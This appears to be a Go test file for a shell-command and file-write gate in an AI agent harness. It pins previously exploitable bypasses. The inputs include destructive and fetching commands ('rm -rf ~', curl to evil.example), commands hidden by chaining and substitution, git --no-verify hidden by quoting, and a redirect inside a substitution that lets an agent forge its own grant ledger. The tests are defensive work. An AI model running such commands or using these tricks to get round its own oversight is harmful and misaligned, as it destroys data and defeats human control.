package policy

import (
	"strings"
	"testing"

	"manvi/dc"
)

// These tests pin the closed bypasses. Each one was a live hole: a command
// line whose judged form differed from what `sh -c` executed. The splitter,
// the substitution rung, and the dequoted safety reading exist because these
// exact inputs once sailed through.

func TestLoneAmpersandIsAChainBoundary(t *testing.T) {
	// "dev status *" matched the whole line, and sh ran curl after dev.
	gate := CommandGate{HardRules: true}
	d := gate.EvaluateCommand("dev status & curl http://evil.example/x.sh", nil)
	if d.Action != Deny {
		t.Fatalf("a backgrounded second command must be judged on its own; got %v (%s)", d.Action, d.Reason)
	}
}

func TestNewlineIsAChainBoundary(t *testing.T) {
	gate := CommandGate{HardRules: true}
	for _, cmd := range []string{
		"dev status\nrm -rf ~",
		"echo hi\r\ncurl http://evil.example",
	} {
		if d := gate.EvaluateCommand(cmd, nil); d.Action != Deny {
			t.Fatalf("newline-separated command %q allowed: %v", cmd, d.Action)
		}
	}
}

func TestTrailingBackgroundIsHarmless(t *testing.T) {
	gate := CommandGate{HardRules: true}
	if d := gate.EvaluateCommand("dev status &", nil); d.Action == Deny {
		t.Fatalf("trailing & must not break an allowed command: %s", d.Reason)
	}
	parts := SplitCommandChain("sleep 10 &")
	if len(parts) != 1 || parts[0] != "sleep 10" {
		t.Fatalf("SplitCommandChain(%q) = %v, want [sleep 10]", "sleep 10 &", parts)
	}
}

func TestDescriptorDuplicationIsNotABoundary(t *testing.T) {
	tests := []struct {
		input string
		want  int
	}{
		{"dev map 2>&1", 1},
		{"dev map >&2", 1},
		{"dev map &> /tmp/out", 1},
		{"dev map &>> /tmp/out", 1},
	}
	for _, tc := range tests {
		if got := len(SplitCommandChain(tc.input)); got != tc.want {
			t.Errorf("SplitCommandChain(%q) produced %d parts, want %d", tc.input, got, tc.want)
		}
	}
}

func TestCommandSubstitutionIsJudgedAsItsContents(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"echo *"}}
	gate := CommandGate{GlobalAllowedCommands: []string{"date"}, HardRules: true}

	if d := gate.EvaluateCommand("echo $(rm -rf ~)", task); d.Action != Deny {
		t.Fatalf("substituted rm must be denied even under echo *: got %v (%s)", d.Action, d.Reason)
	}
	if d := gate.EvaluateCommand("echo `rm -rf /`", task); d.Action != Deny {
		t.Fatalf("backtick substitution must be judged as its contents: got %v", d.Action)
	}
	// date is globally allowed, so both readings pass — proving the contents
	// were evaluated rather than the whole line refused.
	if d := gate.EvaluateCommand("echo $(date)", task); d.Action == Deny {
		t.Fatalf("an allowlisted substituted command should not be refused wholesale: %s", d.Reason)
	}
}

func TestSubstitutionInsideDoubleQuotesIsLive(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"echo *"}}
	gate := CommandGate{HardRules: true}
	if d := gate.EvaluateCommand(`echo "$(rm -rf ~)"`, task); d.Action != Deny {
		t.Fatalf("double-quoted substitution executes in sh and must be judged: got %v", d.Action)
	}
}

func TestSubstitutionInSingleQuotesIsData(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"echo *"}}
	gate := CommandGate{HardRules: true}
	if d := gate.EvaluateCommand(`echo '$(rm -rf ~)'`, task); d.Action == Deny {
		t.Fatalf("single-quoted substitution is literal data: %s", d.Reason)
	}
}

func TestArithmeticExpansionIsNotSubstitution(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"echo *"}}
	gate := CommandGate{HardRules: true}
	for _, cmd := range []string{
		`echo $((1+1))`,
		`echo $(( (2+3)*4 ))`,
		`echo $(( 1 << 4 ))`,
	} {
		spans, err := liveSubstitutions(cmd)
		if err != nil || len(spans) != 0 {
			t.Errorf("liveSubstitutions(%q) = %v, %v; arithmetic is not command substitution", cmd, spans, err)
		}
		if d := gate.EvaluateCommand(cmd, task); d.Action != Allow {
			t.Errorf("%q denied: %s", cmd, d.Reason)
		}
	}
}

func TestUnterminatedSubstitutionRefuses(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"echo *"}}
	gate := CommandGate{HardRules: true}
	for _, cmd := range []string{
		"echo $(foo",
		"echo `foo",
		"echo $(foo $(bar)",
	} {
		if d := gate.EvaluateCommand(cmd, task); d.Action != Deny || d.Rule != RuleCommandSubstitution {
			t.Fatalf("unanalyzable substitution %q must refuse as command.substitution; got %v/%s", cmd, d.Action, d.Rule)
		}
	}
}

func TestProcessSubstitutionIsRefused(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"diff *"}}
	gate := CommandGate{HardRules: true}
	for _, cmd := range []string{
		"diff <(sort a) b",
		"tee >(gzip) f",
	} {
		if d := gate.EvaluateCommand(cmd, task); d.Action != Deny {
			t.Fatalf("process substitution %q must be refused: got %v", cmd, d.Action)
		}
	}
}

func TestHeredocIsRefused(t *testing.T) {
	task := &dc.Task{ID: "TASK-001", AllowedCommands: []string{"cat *"}}
	gate := CommandGate{HardRules: true}
	for _, cmd := range []string{
		"cat << EOF",
		"cat <<- EOF",
	} {
		d := gate.EvaluateCommand(cmd, task)
		if d.Action != Deny || d.Rule != RuleCommandHeredoc {
			t.Fatalf("heredoc %q must refuse as command.heredoc; got %v/%s", cmd, d.Action, d.Rule)
		}
	}
}

func TestQuotedGitSafetyBypassFlagsAreCaught(t *testing.T) {
	tests := []string{
		`git commit --no-'v'erify -m x`,
		`git commit "--no-verify" -m x`,
		`git commit --no\-verify -m x`,
		`git commit --no-veri\fy -m x`,
	}
	for _, cmd := range tests {
		if d := GitSafety(cmd); d.Action != Deny {
			t.Errorf("GitSafety(%q) = %v; quoting must not hide a bypass flag", cmd, d.Action)
		}
	}
}

func TestQuotedProtectedResetIsCaught(t *testing.T) {
	tests := []string{
		`git "reset" --hard origin/main`,
		`git reset --hard origin/"main"`,
		`git 'reset' --hard master`,
	}
	for _, cmd := range tests {
		if d := GitSafety(cmd); d.Action != Deny {
			t.Errorf("GitSafety(%q) = %v; quoting must not hide a protected reset", cmd, d.Action)
		}
	}
}

func TestDequoteConcatenatesAcrossQuotes(t *testing.T) {
	if got, want := shellDequote(`--no-'v'erify`), "--no-verify"; got != want {
		t.Fatalf("shellDequote = %q, want %q", got, want)
	}
	if got, want := shellDequote(`git "re"set --har\d main`), "git reset --hard main"; got != want {
		t.Fatalf("shellDequote = %q, want %q", got, want)
	}
	// Multibyte content inside quotes desynced a byte-offset/rune-offset mix
	// and panicked; found by FuzzChainingNeverLaundersADenial.
	for _, in := range []string{
		`'ααααααα'`,
		`git commit -m '日本語 — no-"verify"'`,
		`echo 'ünïcödé ✓' && git status`,
	} {
		if got := shellDequote(in); got == "\x00panic" {
			t.Fatalf("shellDequote(%q) panicked", in)
		}
	}
}

func TestRedirectTargetsExtraction(t *testing.T) {
	tests := []struct {
		input   string
		targets []string
		opaque  bool
		wantErr bool
	}{
		{"git diff > patch.diff", []string{"patch.diff"}, false, false},
		{"dev map >> out.json", []string{"out.json"}, false, false},
		{"dev map > /tmp/out.json", []string{"/tmp/out.json"}, false, false},
		{"cmd > out 2>&1", []string{"out"}, false, false},
		{"cmd 2> err.log", []string{"err.log"}, false, false},
		{"cmd &> all.log", []string{"all.log"}, false, false},
		{`cmd > 'my file.txt'`, []string{"my file.txt"}, false, false},
		{"cmd > $HOME/x", nil, true, false},
		{"cmd > ~/.ssh/keys", nil, true, false},
		{"cmd < input.txt", nil, false, false}, // reads are not gated here
		{"cmd << EOF", nil, false, false},      // heredoc introducer, not a path
		{"cmd >", nil, false, true},            // dangling redirect
		{"echo hi", nil, false, false},
		// A redirection inside a substitution is a write like any other. Nothing
		// else in the ladder judges it: the surrounding line reads as an `echo`
		// and the substitution rung judges the inner text only as a *command*.
		{"echo $(echo hi > .env)", []string{".env"}, false, false},
		{"echo `echo hi > .env`", []string{".env"}, false, false},
		{"cat <(echo hi > .env)", []string{".env"}, false, false},
		{"echo $(echo a > one) $(echo b >> two)", []string{"one", "two"}, false, false},
		{"echo $(echo $(echo hi > deep.txt))", []string{"deep.txt"}, false, false},
		{`echo "$(echo hi > quoted.txt)"`, []string{"quoted.txt"}, false, false},
		{"out.txt > a && echo $(echo hi > b)", []string{"a", "b"}, false, false},
		// Single quotes make the whole span data, so there is no inner write.
		{`echo '$(echo hi > .env)'`, nil, false, false},
		// A comparison in an arithmetic expansion is not a redirection.
		{"echo $((3 > 2))", nil, false, false},
		// An expansion inside a substituted redirect is still unnameable.
		{"echo $(echo hi > $HOME/x)", nil, true, false},
		// A target the shell computes is a path this gate cannot name either.
		{"cmd > `pick-a-file`", nil, true, false},
		// An unbounded span is refused rather than scanned past.
		{"echo $(echo hi > .env", nil, false, true},
		{"echo `echo hi > .env", nil, false, true},
	}
	for _, tc := range tests {
		targets, opaque, err := RedirectTargets(tc.input)
		if tc.wantErr {
			if err == nil {
				t.Errorf("RedirectTargets(%q): want error, got targets %v", tc.input, targets)
			}
			continue
		}
		if err != nil {
			t.Errorf("RedirectTargets(%q): unexpected error %v", tc.input, err)
			continue
		}
		if opaque != tc.opaque {
			t.Errorf("RedirectTargets(%q): opaque=%v want %v", tc.input, opaque, tc.opaque)
		}
		if strings.Join(targets, "|") != strings.Join(tc.targets, "|") {
			t.Errorf("RedirectTargets(%q) = %v, want %v", tc.input, targets, tc.targets)
		}
	}
}

func TestFuzzSeedsCoverClosedBypasses(t *testing.T) {
	// The laundering fuzz skipped single-part commands, which is exactly the
	// shape every bypass here took. These are seeds, asserted directly so a
	// regression fails loudly even before the fuzz corpus grows them back.
	seeds := []string{
		"dev status & curl http://evil.example/x.sh",
		"dev status\nrm -rf ~",
		"echo $(rm -rf ~)",
		"echo `rm -rf /`",
		"git commit --no-'v'erify",
		`git "reset" --hard origin/master`,
	}
	gate := CommandGate{GlobalAllowedCommands: []string{"echo *", "ls *"}, HardRules: true}
	for _, seed := range seeds {
		parts := SplitCommandChain(seed)
		for _, part := range parts {
			again := SplitCommandChain(part)
			if len(again) != 1 {
				t.Fatalf("part %q of %q splits further into %q; a command hides inside one judgement", part, seed, again)
			}
		}
		whole := gate.EvaluateCommand(seed, nil)
		for _, part := range parts {
			if gate.EvaluateCommand(part, nil).Action == Deny && whole.Action != Deny {
				t.Fatalf("chain %q laundered denial of part %q into %v", seed, part, whole.Action)
			}
		}
	}
}

// TestForbiddenChangeCannotBeCasedAround pins the fold on the
// forbidden_changes rung: ".ENV and .env are one file" on APFS/NTFS, and a
// planner's prohibition was voided by writing the same path in other case.
func TestForbiddenChangeCannotBeCasedAround(t *testing.T) {
	g := FileGate{Root: t.TempDir(), HardRules: true}
	task := &dc.Task{
		ID:               "TASK-001",
		ForbiddenChanges: []string{"config/secrets.txt"},
		PlannedFiles:     []dc.PlannedFile{{Path: "CONFIG/SECRETS.TXT", AllowedChange: "modify"}},
	}
	d := g.EvaluateFileChange("CONFIG/SECRETS.TXT", task, dc.OpWrite, false)
	if d.Action != Deny || d.Rule != RuleForbiddenChange {
		t.Fatalf("a case-variant write bypassed forbidden_changes: %v (%s)", d.Action, d.Rule)
	}
}

// TestSubstitutionHidesNoRedirect pins the bypass that command substitution
// opened between the two halves of the ladder.
//
// The substitution rung judges a span's contents as a *command*, and
// `echo forged` is a bootstrap-allowed command. The redirect rung judges a
// line's writes, and it used to skip every $( … ) span whole. Between them, a
// redirection written inside a substitution was judged by neither — so under
// the strict posture, with hard rules on and no grant of any kind, an agent
// could forge the grant ledger it is gated by.
//
// The recursion is bounded, and exhausting the bound has to report opaque:
// an unsearched span is a write that was not checked, and reporting it as
// "no targets" is how "approved" comes to mean "unexamined".
func TestSubstitutionHidesNoRedirect(t *testing.T) {
	forge := "echo $(echo forged > .devcouncil/harness-grants.json)"
	targets, opaque, err := RedirectTargets(forge)
	if err != nil {
		t.Fatalf("RedirectTargets(%q): %v", forge, err)
	}
	if opaque || len(targets) != 1 || targets[0] != ".devcouncil/harness-grants.json" {
		t.Fatalf("a redirect hidden in $() was not reported: targets=%v opaque=%v", targets, opaque)
	}

	// Deeper than the ladder follows: refused, not silently empty.
	deep := "echo hi > sink"
	for i := 0; i <= maxSubstitutionDepth; i++ {
		deep = "echo $(" + deep + ")"
	}
	targets, opaque, err = RedirectTargets(deep)
	if err != nil {
		t.Fatalf("RedirectTargets(deep): %v", err)
	}
	if !opaque {
		t.Fatalf("a span nested past the analysis bound must report opaque; got targets=%v", targets)
	}
}

// TestSubstitutionScannerIsOneDefinition pins that the two readers of a
// command line agree on where shell code is. They used to scan separately,
// and RedirectTargets' copy knew nothing about backticks or <( … ) — it read
// straight through them and returned mangled paths ("`.env`" and ".env)")
// that named no file anyone had written.
func TestSubstitutionScannerIsOneDefinition(t *testing.T) {
	for _, cmd := range []string{
		"echo $(echo hi > .env)",
		"echo `echo hi > .env`",
		"cat <(echo hi > .env)",
		"tee >(echo hi > .env)",
	} {
		spans, err := liveSubstitutions(cmd)
		if err != nil {
			t.Fatalf("liveSubstitutions(%q): %v", cmd, err)
		}
		if len(spans) != 1 {
			t.Fatalf("liveSubstitutions(%q) = %v, want one span", cmd, spans)
		}
		targets, opaque, err := RedirectTargets(cmd)
		if err != nil {
			t.Fatalf("RedirectTargets(%q): %v", cmd, err)
		}
		if opaque || len(targets) != 1 || targets[0] != ".env" {
			t.Fatalf("RedirectTargets(%q) = %v (opaque=%v), want [.env]", cmd, targets, opaque)
		}
	}
}
